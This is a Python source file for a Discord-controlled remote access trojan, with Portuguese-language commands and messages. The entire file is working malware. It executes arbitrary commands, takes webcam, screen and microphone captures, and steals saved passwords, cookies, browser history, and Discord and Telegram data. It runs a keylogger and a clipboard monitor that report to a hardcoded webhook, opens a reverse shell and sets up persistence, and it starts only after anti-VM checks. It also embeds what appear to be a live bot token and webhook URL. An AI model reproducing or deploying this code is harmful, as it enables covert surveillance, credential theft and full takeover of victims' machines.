import discord
from discord.ext import commands
from discord import app_commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import asyncio
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
from libraries import c0kix, ctrv, d11sc00rdgrrr4b as grabdiscord_lib, d33lf1le as delfile_lib, h4rd4rel1st as hardware_list_lib, ist4rtf1l as startfile_lib, epicgames, layn, t4l3g, uebi, v3tudo, vmsai, xistori
from libraries import hidefile as hidefile_lib
import logging
from libraries import layn



GUILD = discord.Object(id = "1338668151688269935")
CHANNEL = 1341917621582303302
KEYLOGGER_WEBHOOK = "https://discord.com/api/webhooks/1341924453646340157/flbaJNX2Fd3uvGmc3LZq0IwLo9RcVIVR3x-g_5U89iFIcdUOFK3lzfivWfKFHM3PahBd"
CURRENT_AGENT = 0
BOT_TOKEN = "MTM0MTkxODA0MzQ3OTIxNjI1OQ.GRAGNh.7WMbCgbJH0FXwmz7v9E1Hs2wvcHOlnpM82mDsI"

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix = "!", intents = intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()
    
        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()
        my_embed = discord.Embed(title=f"{MSG}",description=f"**Horário: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
        my_embed.add_field(name="**IP**", value=layn.getIP(), inline=True)
        my_embed.add_field(name="**Bits**", value=layn.getBits(), inline=True)
        my_embed.add_field(name="**HostName**", value=layn.getHostname(), inline=True)
        my_embed.add_field(name="**OS**", value=layn.getOS(), inline=True) 
        my_embed.add_field(name="**Usuario**", value=layn.getUsername(), inline=True)
        my_embed.add_field(name="**CPU**", value=layn.getCPU(), inline=False)
        my_embed.add_field(name="**Admin**", value=layn.isAdmin(), inline=True)
        my_embed.add_field(name="**VM**", value=layn.isVM(), inline=True)
        my_embed.add_field(name="**Keylogger**", value=False, inline=True)
        await self.channel.send(embed=my_embed)

    async def setup_hook(self):
        await self.tree.sync(guild = GUILD)

    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

class InteractButton(discord.ui.View):
    def __init__(self, inv:str, id:int):
        super().__init__()
        self.inv  = inv
        self.id = id

    @discord.ui.button(label="interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(embed=discord.Embed(title=f"Interagindo com o ID {self.id}", color=0x00FF00), ephemeral=True)

    @discord.ui.button(label="Terminar", style=discord.ButtonStyle.gray, emoji="❌")
    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        my_embed = discord.Embed(title=f"Terminando conexão com ID #{self.id}", color=0x00FF00)
        await interaction.response.send_message(embed=my_embed)
        await bot.close()        
        sys.exit()

    @discord.ui.button(label="WebCam", style=discord.ButtonStyle.gray, emoji="📸")
    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.webshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Erro ao tirar Foto da Webcam para o ID #{self.id}", color=0xFF0000)
            await interaction.response.send_messagey(embed=my_embed)

    @discord.ui.button(label="Processos", style=discord.ButtonStyle.gray, emoji="📊")
    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.process()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file=discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")


    @discord.ui.button(label="Print", style=discord.ButtonStyle.gray, emoji="🖼️")
    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.screenshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao Printar o ID #{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="Credenciais/Passoword", style=discord.ButtonStyle.gray, emoji="🔑")
    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.creds()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao roubar senhas do ID #{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="Persistencia", style=discord.ButtonStyle.gray, emoji="🔁")
    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistência ativada para o ID #{self.id}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao ativar persistência para o ID #{self.id}", color=0xFF0000)
        await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="Localizacao", style=discord.ButtonStyle.gray, emoji="🌐")
    async def location(self, interaction:discord.Interaction, button:discord.ui.Button):
        response = layn.location()
        if response != False:
            my_embed = discord.Embed(title=f"Localização do ID #{self.id}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="Cidade:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Pais:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error ao pegar localização do ID #{self.id}", color=0xFF0000)
        await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="Autodestruicao", style=discord.ButtonStyle.red, emoji="💣")
    async def selfdestruct(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"#{ID} deletado", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao deletar id  #{self.id}: {result}", color=0xFF0000)
        await interaction.response.send_message(embed=my_embed)

bot = Bot()





@bot.hybrid_command(name = "interact", with_app_command = True, description = "Interagir com o Client")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, id:int):
    global CURRENT_AGENT 
    CURRENT_AGENT = id
    my_embed = discord.Embed(title=f"interagindo com o ID #{id}", color=0x00FF00)
    await ctx.reply(embed=my_embed)
    




@bot.hybrid_command(name = "conexao", with_app_command = True, description = "ID CONCECTADO")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context):
    global CURRENT_AGENT 
    CURRENT_AGENT = ID
    my_embed = discord.Embed(title=f"CONECTADO AO ID #{CURRENT_AGENT}", color=0x00FF00)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Execute qualquer comando na máquina de destino")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, command:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.cmd(command)
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply("```"+result+"```")
    

@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Execute qualquer comando em todos os IDs online")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command:str):
    result = layn.cmd(command)
    if len(result) > 4000:
        path = os.environ["temp"] +"\\response.txt"     
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply("```"+result+"```")


@bot.hybrid_command(name = "webcam", with_app_command = True, description = "Capture uma imagem da webcam da máquina alvo")
@app_commands.guilds(GUILD)
async def webshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"use **!webcam {ID}** em vez do comando slash", color=0xFF0000)
            await ctx.reply(embed=my_embed) 
        else:
            result = layn.webshot()
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error ao tirar foto da webcam #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
    
        
@bot.hybrid_command(name = "cd", with_app_command = True, description = "Alterar o diretório atual na máquina de destino")
@app_commands.guilds(GUILD)
async def cd(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.cd(path)
        if (result):
            my_embed = discord.Embed(title=f"Alterado com sucesso o diretório para: {path}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao acessar o diretório:\n{result}", color=0xFF0000)    
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "process", with_app_command = True, description = "Listar todos os processos em execução na máquina de destino")
@app_commands.guilds(GUILD)
async def process(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.process()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```\n{result}\n```")
    
@bot.hybrid_command(name = "startfile", with_app_command = True, description = "Inicia um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def startfile(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = startfile_lib.start_file(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} iniciado com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao iniciar o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "delfile", with_app_command = True, description = "Deleta um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def delfile(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = delfile_lib.delete_file(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} deletado com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao deletar o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "hidefile", with_app_command = True, description = "Esconde um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def hidefile(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = hidefile_lib.hide_file(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} escondido com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao esconder o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "unhidefile", with_app_command = True, description = "Desesconde um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def unhidefile(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = hidefile_lib.unhide_file(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} desescondido com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao desesconder o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "hardware", with_app_command = True, description = "Lista o hardware da máquina de destino")
@app_commands.guilds(GUILD)
async def hardware_list(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = hardware_list_lib.hardware_list()
        await ctx.reply(embed=discord.Embed(title=f"Hardware do #{ID}", description=result, color=0x00FF00))


@bot.hybrid_command(name="discord", with_app_command=True, description="Obtém o token do Discord da máquina de destino")
@app_commands.guilds(GUILD)
async def grabdiscord(ctx: commands.Context):
     
     if ctx.interaction:
            my_embed = discord.Embed(title=f"use **!discord** em vez do comando slash", color=0xFF0000)
            await ctx.reply(embed=my_embed)
     else:  
        if (int(CURRENT_AGENT) == int(ID)):
            result = grabdiscord_lib.grab_discord().initialize(raw_data=False)
            if isinstance(result, list):
                for embed in result:
                    await ctx.reply(embed=embed)
            else:
                await ctx.reply(embed=discord.Embed(title=f"Erro ao obter tokens do Discord do #{ID}: {result}", color=0xFF0000))


@bot.hybrid_command(name = "upload", with_app_command = True, description = "Carregar um arquivo para o ID")
@app_commands.guilds(GUILD)
async def upload(ctx: commands.Context, url:str, name:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.upload(url, name)
        if result:
            my_embed = discord.Embed(title=f"{name} foi carregado para ID #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao carregar {name} para #{ID}:\n{result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)



@bot.hybrid_command(name="stealepic", with_app_command=True, description="Rouba o arquivo GameUserSettings.ini do Epic Games Launcher")
@app_commands.guilds(GUILD)
async def steal_epic(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        success, temp_p = epicgames.stealEpic()
        if success:
            await ctx.reply(file=discord.File(temp_p))
            os.remove(temp_p)
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao roubar o arquivo GameUserSettings.ini no #{ID}: {temp_p}", color=0xFF0000))



@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Faça uma captura de tela da tela da máquina de destino")
@app_commands.guilds(GUILD)
async def screenshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao tirar uma captura de tela para #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "creds", with_app_command = True, description = "Obtenha as credenciais da máquina de destino")
@app_commands.guilds(GUILD)
async def creds(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.creds()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao obter credenciais do #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)



@bot.hybrid_command(name = "screenrec", with_app_command = True, description = "Gravar a tela da máquina de destino")
@app_commands.guilds(GUILD)
async def screenrec_cmd(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        await ctx.reply("`Recording... Please wait.`")
        result = layn.screenrec()
        if result:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            embed = discord.Embed(title="📛 Error", description="An error occurred during screen recording.", colour=discord.Colour.red())
            await ctx.reply(embed=embed)


@bot.hybrid_command(name = "isadmin", with_app_command = True, description = "Verifica se o bot está sendo executado como administrador")
@app_commands.guilds(GUILD)
async def isadmin_cmd(ctx: commands.Context):
    if layn.isAdmin():
        my_embed = discord.Embed(title="Admin Check", description="O bot está sendo executado como administrador.", color=0x00FF00)
    else:
        my_embed = discord.Embed(title="Admin Check", description="O bot NÃO está sendo executado como administrador.", color=0xFF0000)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "persistent", with_app_command = True, description = "Tornar o agente persistente na máquina de destino")
@app_commands.guilds(GUILD)
async def persistent(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistência habilitada no #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao habilitar a persistência no #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "ls", with_app_command = True, description = "Listar todos os agentes on-line atuais")
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
         my_embed = discord.Embed(title=f"use **!ls** em vez do comando slash", color=0xFF0000)
         await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"ID #{ID}", color=0xADD8E6)
        my_embed.add_field(name="**IP**", value=layn.getIP(), inline=True)
        my_embed.add_field(name="**OS**", value=layn.getOS(), inline=True)
        my_embed.add_field(name="**Usuario**", value=layn.getUsername(), inline=True)
        view = InteractButton("Interagir", ID)
        await ctx.reply(embed=my_embed, view=view)

@bot.hybrid_command(name = "download", with_app_command = True, description = "Baixar arquivo da máquina de destino")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            await ctx.reply(f"Downlaod no **ID #{ID}** | Arquivo solicitado:", file=discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(title=f"Error ao baixar do #{ID}:\n{e}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "encerrar", with_app_command = True, description = "Encerrar o agente")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        my_embed = discord.Embed(title=f"Encerrando a conexão com o #{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()        
        sys.exit()
    

@bot.hybrid_command(name = "excluir", with_app_command = True, description = "Excluir o agente da máquina de destino")
@app_commands.guilds(GUILD)
async def selfdestruct(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"#{ID} excluido", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao excluir o #{ID}: {result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "localizar", with_app_command = True, description = "Obtenha a localização da máquina alvo")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        response = layn.location()
        if response != False:
            my_embed = discord.Embed(title=f"Localização baseada em IP no #{ID}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="Cidade:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Pais:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error ao obter a localização do #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Obtenha um shell reverso na máquina alvo")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context, ip:str, port:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.revshell(ip, port)
        if result:
            my_embed = discord.Embed(title=f"Tentando estabelecer o Reverse Shell no #{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
    
    
@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Grave o microfone da máquina alvo")
@app_commands.guilds(GUILD)
async def recordmic(ctx: commands.Context, seconds:int):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"use **!recordmic {ID}** em vez do comando slash", color=0xFF0000)
            await ctx.reply(embed=my_embed)
        else:
            result = layn.recordmic(seconds)
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error ao iniciar a gravação no #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Alterar o papel de parede da máquina alvo")
@app_commands.guilds(GUILD)
async def wallpaper(ctx: commands.Context, path_url:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.wallpaper(path_url)
        if result:
            my_embed = discord.Embed(title=f"Papel de parede alterado no #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao mudar o papel de parede no #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Mate um processo na máquina alvo")
@app_commands.guilds(GUILD)
async def killproc(ctx: commands.Context, pid:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.killproc(pid)
        if result:
            my_embed = discord.Embed(title=f"Processo {pid} morto no #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao matar o processo {pid} no #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Inicie um keylogger na máquina de destino")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context, mode:str ,interval:int):
    if (int(CURRENT_AGENT) == int(ID)):
        logger = v3tudo.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger parado no #{ID}", color=0x00FF00))
        else:
            threading.Thread(target=logger.start).start()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger iniciado no #{ID}", color=0x00FF00))
    


# Configuração do logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(asctime)s - %(message)s')

@bot.hybrid_command(name = "telegram", with_app_command = True, description = "Obtenha o telegram da máquina de destino")
@app_commands.guilds(GUILD)
async def t4l3g(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        await ctx.reply("Já já seu arquivo é enviado... *Pode demorar por conta do servidor de upload + tamanho**")

        def callback(result):
            if result != False:
                tutorial_message = (
                    "### Como usar o arquivo:\n"
                    "1. Baixe o arquivo enviado.\n"
                    "2. Extraia o conteúdo do arquivo zip.\n"
                    "3. Abra a pasta extraída para acessar os dados do Telegram.\n"
                    "4. Extraia e mova os arquivos para a pasta tdata.\n"
                )
                asyncio.run_coroutine_threadsafe(ctx.reply(tutorial_message, f"TDATA: {result}"), bot.loop)
            else:
                my_embed = discord.Embed(title=f"Erro ao obter telegram do #{ID}", color=0xFF0000)
                asyncio.run_coroutine_threadsafe(ctx.reply(embed=my_embed), bot.loop)
        
        threading.Thread(target=layn.g3t_t3l3g4am, args=(callback,)).start()

@bot.hybrid_command(name = "historico", with_app_command = True, description = "Obtenha o histórico de navegação da máquina de destino")
@app_commands.guilds(GUILD)
async def xistori(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.history()
        if result:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao obter histórico do #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="cookies", with_app_command=True, description="Obtém os cookies dos navegadores da máquina de destino")
@app_commands.guilds(GUILD)
async def grabcookie(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        zip_path = layn.cookies()
        if zip_path:
            await ctx.reply(file=discord.File(zip_path))
            os.remove(zip_path)
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao obter cookies no #{ID}", color=0xFF0000))
    else:
        await ctx.reply(embed=discord.Embed(title=f"Erro ao obter cookies no #{ID}", color=0xFF0000))


clipboard_monitor = None
@bot.hybrid_command(name = "clip", with_app_command = True, description = "Obtenha o clipboard da máquina de destino")
@app_commands.guilds(GUILD)
async def clip(ctx: commands.Context, mode: str):
    global clipboard_monitor
    if (int(CURRENT_AGENT) == int(ID)):
        if mode == "on":
            category = await ctx.guild.create_category(f"ID-{ID}")
            channel = await category.create_text_channel("clipboard")
            clipboard_monitor = ctrv.ClipboardMonitor(interval=5, ID=ID, webhook=KEYLOGGER_WEBHOOK)
            clipboard_monitor.start()
            my_embed = discord.Embed(title=f"Clipboard monitor iniciado no #{ID}", color=0x00FF00)
            await ctx.reply(embed=my_embed)
        elif mode == "off":
            if clipboard_monitor:
                clipboard_monitor.stop()
                clipboard_monitor = None
                my_embed = discord.Embed(title=f"Clipboard monitor parado no #{ID}", color=0x00FF00)
                await ctx.reply(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Logg de Clipboard não está em execução para #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Modo de uso invalido Use 'on' ou 'off'.", color=0xFF0000)
            await ctx.reply(embed=my_embed)
            #await ctx.reply("Invalid mode. Use 'on' or 'off'.")


@bot.hybrid_command(name = "help", with_app_command = True, description = "Menu de ajuda")
@app_commands.guilds(GUILD)
async def help(ctx: commands.Context):
    fields = [
        ("/interact <id>", "Interaja com um id específico"),
        ("/conexao", "Mostrar ID atual"),
        ("/cmd <command>", "Executar comando no alvo"),
        ("/cd <path>", "Alterar diretório atual"),
        ("/webcam", "Tire uma foto da webcam"),
        ("/process", "Obtenha uma lista de todos os processos em execução"),
        ("/upload <url>", "Carregar arquivo para o ID"),
        ("/screenshot", "Pegue uma captura de tela do id"),
        ("/creds", "Obter credenciais salvas do Chrome"),
        ("/persistent", "Habilitar persistência"),
        ("/ls", "Obtenha uma lista de todos os ids ativos"),
        ("/download <path>", "Baixar arquivo do id"),
        ("/encerrar", "Encerrar a sessão"),
        ("/cmd-all <command>", "Execute um comando em todos os id"),
        ("/localizar", "Obtenha a localização da máquina alvo"),
        ("/revshell <ip> <port>", "Obtenha um shell reverso na máquina alvo"),
        ("/recordmic <interval>", "Grave o microfone da máquina alvo"),
        ("/wallpaper <path/url>", "Alterar o papel de parede da máquina alvo"),
        ("/killproc <pid>", "Mate um processo na máquina alvo"),
        ("/keylog <mode> <interval>", "start/stop um keylogger na máquina de destino\n/`keylog start 60`"),
        ("/excluir", "Excluir o agente"),
        ("/cookies", "Roubar cookies dos navegadores"),
        ("/historico", "Roubar o historico dos navegadores"),
        ("/clip <mode>", "on/off o monitoramento do clipboard"),
        ("/startfile <path>", "Inicie um arquivo no alvo"),
        ("/delfile <path>", "Deleta um arquivo no alvo"),
        ("/hidefile <path>", "Esconde um arquivo no alvo"),
        ("/unhidefile <path>", "Desesconde um arquivo no alvo"),
        ("/hardware", "Lista o hardware da máquina de destino"),
        ("/discord", "Obtenha o token do Discord da máquina de destino"),
        ("/isadmin", "Verifica se o bot está sendo executado como administrador"),
        ("/screenrec", "Gravar a tela da máquina de destino"),
        ("/stealepic", "Obtenha o games.ini da máquina de destino")
    ]

    embeds = []
    for i in range(0, len(fields), 25):
        my_embed = discord.Embed(title="Menu de Ajuda", color=0x00FF00)
        for name, value in fields[i:i+25]:
            my_embed.add_field(name=name, value=value, inline=False)
        embeds.append(my_embed)

    for embed in embeds:
        await ctx.reply(embed=embed)



if vmsai.test() == True and layn.isVM() == False:
    config = layn.createConfig()
    ID = layn.id()
    if config:
        MSG = f"NOVO ID ONLINE #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"ID ONLINE #{ID}"
        COLOR = 0x0000FF

    bot.run(BOT_TOKEN)
